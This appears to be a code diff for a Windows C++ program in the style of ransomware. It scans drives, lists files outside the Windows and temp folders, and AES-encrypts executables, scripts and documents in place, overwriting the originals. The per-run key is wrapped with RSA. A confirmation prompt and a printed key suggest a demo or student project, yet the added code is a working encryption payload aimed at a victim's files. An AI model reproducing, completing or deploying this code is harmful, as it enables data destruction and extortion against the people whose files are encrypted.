@@ -1,16 +1,25 @@
 #include <cstdio>
 #include <cstdlib>
 #include <ctime>
+#include <string>
+#include <fstream>
 #include <iostream>
 #include <Windows.h>
 
+
 #include "aes256.cpp"
+#include "keygen.cpp"
+#include "rsaproj.cpp"
 
 #define BUFFER_SIZE 1024*1024
 
+#ifdef __APPLE__
+#define fseeko64 fseeko
+#endif
+
 using namespace std;
 
-int encrypt(char *ginput, char *gkey) {
+void encrypt(char *ginput, char *gkey) {
     ByteArray key, enc;
     size_t file_len;
     FILE *input, *output;
@@ -22,9 +31,9 @@ int encrypt(char *ginput, char *gkey) {
     input = fopen(ginput, "rb");
     output = fopen(goutput, "wb");
     Aes256 aes(key);
-    _fseeki64(input, 0, SEEK_END);
+    fseeko64(input, 0, SEEK_END);
     file_len = ftell(input);
-    _fseeki64(input, 0, SEEK_SET);
+    fseeko64(input, 0, SEEK_SET);
     enc.clear();
     aes.encrypt_start(file_len, enc);
     fwrite(enc.data(), enc.size(), 1, output);
@@ -44,23 +53,94 @@ int encrypt(char *ginput, char *gkey) {
         fclose(input);
         fclose(output);
         CopyFile(goutput, ginput, 0);
-        return 0;
+}
+
+bool endsWith(const std::string &mainStr, const std::string &toMatch)
+{
+    if(mainStr.size() >= toMatch.size() &&
+       mainStr.compare(mainStr.size() - toMatch.size(), toMatch.size(), toMatch) == 0)
+        return true;
+    else
+        return false;
 }
 
 int main(int argc, char** argv) {
-    char key[] = "whovvfmuryfexbrk";
+
+    cout << "Are you sure you want to encrypt your whole disk? y/n -> ";
+    char choice = 'n';
+    cin >> choice;
+    if (choice != 'y') {
+        exit(0);
+    }
+
+    string key_str = keygen(16);
+    char *key = new char[key_str.length() + 1];
+    strcpy(key, key_str.c_str());
+    key_str = ttn(key);
+    cout << "Key:" << key << "\n";
+    cout << "Number key -> " << key_str << "\n";
+
+
+    string rsa_key = encrypt_rsa(key_str);
+    cout << "RSA key -> " << rsa_key << "\n";
+
     DWORD mydrives = 100;
     char lpBuffer[100];
     DWORD GLDS = GetLogicalDriveStrings(mydrives, (LPSTR) lpBuffer);
 
     for(int i = 0; i < 100; i++)
-        if(lpBuffer[i] && (lpBuffer[i] >= 'A' && lpBuffer[i] <= 'Z')) {
+        if(lpBuffer[i] && lpBuffer[i] <= 'C') {
             snprintf(lpBuffer, sizeof(lpBuffer), "%c", lpBuffer[i]);
             string buffAsStdStr = lpBuffer;
             string result = "dir -d " + buffAsStdStr + ":\\ /s/b " + ">> list";
             cout << result + '\n';
-            char *file_to_enc = new char[result.length() + 1];
-            strcpy(file_to_enc, result.c_str());
-            encrypt(file_to_enc, key);
+            system(result.c_str());
         }
+
+    cout << "Done scanning the disk!\n";
+
+    ifstream ifs("list");
+    string line;
+
+    while(getline(ifs, line))
+    {
+        if (line.find("Windows") != string::npos) {
+            continue;
+        }
+        else if (endsWith(line, "decrypt.exe")) {
+            continue;
+        }
+        else if (line.find("temp") != string::npos) {
+            continue;
+        }
+        else if (line.find("Temp") != string::npos) {
+            continue;
+        }
+        else if (endsWith(line, ".dll")) {
+            if (line.find("Nls") != string::npos) {
+                continue;
+            }
+        }
+        else if (endsWith(line, ".exe")) {
+        }
+        else if (endsWith(line, ".bat")) {
+        }
+        else if (endsWith(line, ".txt")) {
+        }
+        else if (endsWith(line, ".docx")) {
+        }
+        else if (endsWith(line, ".doc")) {
+        }
+        else {
+            continue;
+        }
+        char *line_char = new char[line.length() + 1];
+        strcpy(line_char, line.c_str());
+        cout << line_char << "\n";
+        encrypt(line_char, key);
+
+    }
+    cout << "Done encrypting, bye bye! ;)\n";
+    cin.get();
+    return 0;
 }
